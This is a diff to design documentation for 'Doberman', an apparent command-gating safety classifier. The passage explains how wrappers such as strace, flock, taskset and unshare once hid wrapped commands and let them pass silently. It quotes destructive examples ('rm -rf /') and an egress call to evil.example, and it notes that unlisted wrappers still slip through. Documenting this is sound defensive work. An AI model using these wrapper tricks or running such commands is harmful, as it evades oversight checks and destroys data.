@@ -285,14 +285,14 @@ steps up to `AUTH` (`opaque_command`) instead of silently passing through.
 Before this fix, `strace`, `flock`, `unshare`, and `taskset` were exactly that kind of unrecognized
 wrapper, and the actual result was worse than the ambiguous-egress `AUTH` this document used to claim:
 none of the four was on the wrapper list at all, so the shared helper didn't even try to skip past
-their options — it read the wrapper's own name as the command verb, found no destructive pattern and
+their options. It read the wrapper's own name as the command verb, found no destructive pattern and
 no known egress tool there, and let the whole line through. `strace -f rm -rf /`, `flock /tmp/lock
 rm -rf /`, `taskset -c 0 rm -rf /`, and `unshare -n curl http://evil.example/x` were each a silent
 `PASS`, hiding the wrapped command entirely rather than stepping up to `AUTH`. All four are now on
 the recognized-wrapper list above and classify the same as their unwrapped form.
 
 The honest remaining gap: a wrapper outside that list still shifts the argument list in a way
-Doberman doesn't recognize, so its wrapped command isn't seen at all — the same silent-`PASS` failure
+Doberman doesn't recognize, so its wrapped command isn't seen at all, the same silent-`PASS` failure
 mode these four just came out of, not the `AUTH` step-up this section previously (and incorrectly)
 described.
 
